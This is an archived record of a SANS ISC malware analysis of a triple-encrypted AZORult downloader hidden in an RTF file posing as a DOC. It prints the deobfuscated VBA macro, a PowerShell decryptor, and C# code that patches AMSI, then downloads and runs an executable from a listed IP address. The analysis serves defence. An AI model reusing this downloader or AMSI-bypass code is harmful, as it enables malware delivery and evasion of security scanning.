{
    "id": "aa1b511b-d8b8-4689-8457-ecf2c0083180",
    "created_at": "2023-01-12T15:01:54.503526Z",
    "updated_at": "2025-03-27T02:05:21.045977Z",
    "deleted_at": null,
    "sha1_hash": "d0f1f9d17fd0451db0f7c378c2bdae5fec12d59a",
    "title": "2020-02-03 - Analysis of a triple-encrypted AZORult downloader",
    "authors": "",
    "file_creation_date": "2022-05-28T04:03:29Z",
    "file_modification_date": "2022-05-28T04:03:29Z",
    "file_size": 573937,
    "plain_text": "# SANS ISC: Analysis of a triple-encrypted AZORult downloader - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**[isc.sans.edu/forums/diary/Analysis+of+a+tripleencrypted+AZORult+downloader/25768/](https://isc.sans.edu/forums/diary/Analysis+of+a+tripleencrypted+AZORult+downloader/25768/)**\n\n[← Next Thread](https://isc.sans.edu/forums/diary/Fake+browser+update+pages+are+quotstill+a+thingquot/25774/)\n[Previous Thread →](https://isc.sans.edu/forums/diary/Video+Stego+amp+Cryptominers/25764/)\n\nAnalysis of a triple-encrypted AZORult downloader\n\n\nI recently came across an interesting malicious document. Distributed as an attachment of a run-of-the-mill malspam message,\nthe file with a DOC extension didn’t look like anything special at first glance. However, although it does use macros as one\nmight expect, in the end, it turned out not to be the usual simple maldoc as the following chart indicates.\n\nThe message to which the file was attached was fairly uninteresting as it used one of the standard malspam/phishing types of\ntext (basically it was a “request for quotation”, as you may see in the following picture) and there was no attempt made to mask\nor forge the sender in the SMTP headers.\n\n\nJan\n\n73\nPosts\n\nISC\nHandler\nFeb 3rd\n2020\n\n\n-----\n\nAfter an initial analysis, it became obvious that the DOC extension was not genuine and that the file was really a Rich Text File\n(RTF). When opening such a file, one usually doesn’t expect Excel to start up and ask user to enable macros. However, as you\nmay have guessed, this was exactly what opening of this RTF resulted in. In fact, after it’s opening, not one, but four requests\nfrom Excel to enable macros were displayed one after the other.\n\nOnly after these dialogs were dealt with did Word finish loading the seemingly nearly empty RTF and displayed it.\n\n\n-----\n\nThe behavior mentioned above was the result of four identical Excel spreadsheets embedded as OLE objects in the RTF\nbody…\n\n[…with the “\\objupdate” mechanism[1] used to open each of them in turn when the RTF was loaded.](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)\n\n\n-----\n\nThis technique of repeatedly opening the “enable macros” dialog using multiple OLE objects in a RTF file is not new in\n[malicious code[2]. Although it isn’t too widely used, displaying of seemingly unending pop-ups would probably be one of the](https://www.zscaler.com/blogs/research/malicious-rtf-document-leading-netwiredrc-and-quasar-rat)\nmore effective ways to get users to allow macros to run, since they might feel that it would be the only way to stop additional\nprompts from displaying.\n\n[After dumping out one of the spreadsheets using rtfobj[3], the XLS itself could be analyzed using oledump[5].](https://github.com/decalage2/oletools/wiki/rtfobj)\n\nThe only macro present in the XLS file had a very simple structure. It was only supposed to decrypt and decode a payload and\nexecuted it using the VBA “shell” command. One small point of interest was that the payload, which it was supposed to decrypt,\nwas not contained in the macro itself but rather in one of the cells (136, 8) of the spreadsheet. The encryption algorithm used in\nthe macro was quite an elementary one as you may see from the following code. For completeness sake, it should be\nmentioned that second cell referenced in the code (135, 8) only contained the string “&H” used to mark values as hexadecimal\nin VBA.\n\n\n-----\n\n```\nSub Workbook_Open() \n     haggardly\nEnd Sub\nPrivate Sub haggardly()\n     Dim psychoanalytic As Long: Dim unwelcomed As String: psychoanalytic = 1\n     GoTo target\n     narcomania:\n          unwelcomed = unwelcomed & Chr(CInt(Sheets(\"EnZWr\").Cells(135, 8).Value & Mid(belive, psychoanalytic,\n2)) - 41)\n          psychoanalytic = psychoanalytic + 2\n          GoTo target\n     target:\n          belive = Sheets(\"EnZWr\").Cells(136, 8).Value\n          If psychoanalytic <= Len(belive) Then\n              GoTo narcomania\n          Else\n              Shell unwelcomed\n              Exit Sub\n          End If\nEnd Sub\n\n```\nThe code, which was supposed to be decrypted and executed by the macro, turned out not to be the final payload of the\nmaldoc, but rather an additional decryption envelope – this time a PowerShell one. The encryption algorithm used in it was not\nvery complex either. However, since it was almost certainly intended as an obfuscation mechanism rather than anything else,\ncryptographic strength would be irrelevant to its purpose.\n```\npowershell -WindowStyle Hidden \nfunction rc1ed29\n{\n     param($o6fb33)$jdc39='k7ce46';\n     $t2e762='';\n     for ($i=0; $i -lt $o6fb33.length; $i+=2)\n     {\n          $c48e2=[convert]::ToByte($o6fb33.Substring($i,2),16);\n          $t2e762+=[char]($c48e2 -bxor $jdc39[($i/2)%$jdc39.length]);\n     }\n     return $t2e762;\n}\n$xe549 = '1e440a0b...data omitted...075e494b';\n$xe5492 = rc1ed29($xe549);\nAdd-Type -TypeDefinition $xe5492;\n[bb7f287]::b9ca7ba();\n\n```\nResult of the previous code, or rather its decryption portion, was the final payload – a considerably obfuscated C# code. After\ndeobfuscation, its main purpose become clear. It was supposed to download a file from a remote server, save it as c2ef3.exe in\nthe AppData folder and execute it.\n\n\n-----\n\n```\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Net;\npublic class bb7f287\n{\n     [DllImport(\"kernel32\",EntryPoint=\"GetProcAddress\")] public static extern IntPtr GetProcAddress(IntPtr\nkey,string bdf77a);\n     [DllImport(\"kernel32\", EntryPoint = \"LoadLibrary\")] public static extern IntPtr LoadLibrary(string mf43f84);\n     [DllImport(\"kernel32\", EntryPoint=\"VirtualProtect\")] public static extern bool VirtualProtect(IntPtr\nod5551,UIntPtr j1698, uint ue73e, out uint s1b1c16);\n     [DllImport(\"Kernel32.dll\", EntryPoint=\"RtlMoveMemory\", SetLastError=false)] static extern void\nRtlMoveMemory(IntPtr qfcea,IntPtr c37f1d,int s89a7);\n     public static int b9ca7ba()\n     {\n          IntPtr amsi_library = LoadLibrary(amsi.dll);\n          if(amsi_library==IntPtr.Zero)\n          {\n              goto download;\n          }\n          IntPtr amsiScanBuffer=GetProcAddress(amsi_library,AmsiScanBuffer));\n          if(amsiScanBuffer==IntPtr.Zero)\n          {\n              goto download;\n          }\n          UIntPtr pointerLen=(UIntPtr)5;\n          uint y372d=0;\n          if(!VirtualProtect(amsiScanBuffer,pointerLen,0x40,out y372d))\n          {\n              goto download;\n          }\n          Byte[] byte_array={0x31,0xff,0x90};\n          IntPtr allocatedMemory=Marshal.AllocHGlobal(3);\n          Marshal.Copy(byte_array,0,allocatedMemory,3);\n          RtlMoveMemory(new IntPtr(amsiScanBuffer.ToInt64()+0x001b),allocatedMemory,3);\n          download: \n          WebClient gaa7c=new WebClient();\n          string\nsavePath=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+\"\\\\c2ef3\"+DecryptInput(\"45521b00\");\ngaa7c.DownloadFile(DecryptInput(\"034317150e19440653511a045f034d520d185a05504a7545447a37480606520652541a5c1b50\"),saveP\nath);\n          ProcessStartInfo finalPayload=new ProcessStartInfo(savePath);\n          Process.Start(finalPayload);\n          return 0;\n     }\n     public static string DecryptInput(string input)\n     {\n          string key=\"k7ce46\";\n          string output=String.Empty;\n          for(int i=0; i<input.Length; i+=2)\n          {\n              byte inputData=Convert.ToByte(input.Substring(i,2),16);\n              output+=(char)(inputData ^ key[(i/2) % key.Length]);\n          }\n          return output;\n     }\n}\n\n```\nAs you may have noticed, the link to the remote file was protected with a third layer of encryption using the same algorithm we\nhave seen in the PowerShell envelope. After decryption, it came down to the following URL.\n```\nhttp://104.244.79.123/As/MT-209111.jpg\n\n```\n[At the time of analysis, the file was no longer available at that URL, however information from URLhaus[5] and Any.Run[6]](https://urlhaus.abuse.ch/url/286973/)\npoints firmly to it being a version of AZORult infostealer.\n\nOne interesting point related to the final payload of the downloader which should be mentioned is, that besides downloading the\nmalicious executable, the code also tries to bypass the Microsoft Anti-Malware Scanning Interface (AMSI) using a well-known\n[memory patching technique[7]. And that, given similarities of the code, it would seem that authors of the downloader re-used a](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/)\n[code sample available online[8] for the bypass, instead of writing their own code.](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)\n\nIn any case, with the use of Word, Excel, PowerShell and three layers of home-grown encryption, this downloader really turned\nout to be much more interesting than a usual malspam attachment.\n\n\n-----\n\n**p** **(** **)**\nMT-209111.DOC (403 kB)\nMD5 - 2c93fb1a782b37146be53bd7c7a829da\nSHA1 - 085518dabedac3abdb312fdd0049b7b5f9af037a\n\nEmbedded XLS spreadsheet (46 kB)\nMD5 - ae79867244d9a3aae92a57da8cbb2655\nSHA1 - 67ca2a50cc91ccd53f80bb6e29a9eae3c6128855\n\nMT-209111.jpg / c2ef3.exe (837 kB)\nMD5 - 2d9dc807216a038b33fd427df53100b6\nSHA1 - 6a8e6246f70692d86a5ec5b37e293932a20ee0f3\n\nDownload URL\nhttp://104.244.79.123/As/MT-209111.jpg\n\n[1] https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/\n\n[2] https://www.zscaler.com/blogs/research/malicious-rtf-document-leading-netwiredrc-and-quasar-rat\n\n[3] https://github.com/decalage2/oletools/wiki/rtfobj\n\n[4] https://blog.didierstevens.com/programs/oledump-py/\n\n[5] https://urlhaus.abuse.ch/url/286973/\n\n[6] https://app.any.run/tasks/e823495e-eb8e-436d-b8e1-0193648e6036/\n\n[7] https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/\n\n[8] https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html\n\n----------Jan Kopriva\n[@jk0pr](https://twitter.com/jk0pr)\n[Alef Nula](https://www.alef.com/en/)\n\n[← Next Thread](https://isc.sans.edu/forums/diary/Fake+browser+update+pages+are+quotstill+a+thingquot/25774/)\n[Previous Thread →](https://isc.sans.edu/forums/diary/Video+Stego+amp+Cryptominers/25764/)\n\n[Sign Up for Free or](https://isc.sans.edu/register.html) [Log In to start participating in the conversation!](https://isc.sans.edu/login.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-03 - Analysis of a triple-encrypted AZORult downloader.pdf"
    ],
    "report_names": [
        "2020-02-03 - Analysis of a triple-encrypted AZORult downloader.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535714,
    "ts_updated_at": 1743041121,
    "ts_creation_date": 1653710609,
    "ts_modification_date": 1653710609,
    "files": {
        "pdf": "https://archive.orkl.eu/d0f1f9d17fd0451db0f7c378c2bdae5fec12d59a.pdf",
        "text": "https://archive.orkl.eu/d0f1f9d17fd0451db0f7c378c2bdae5fec12d59a.txt",
        "img": "https://archive.orkl.eu/d0f1f9d17fd0451db0f7c378c2bdae5fec12d59a.jpg"
    }
}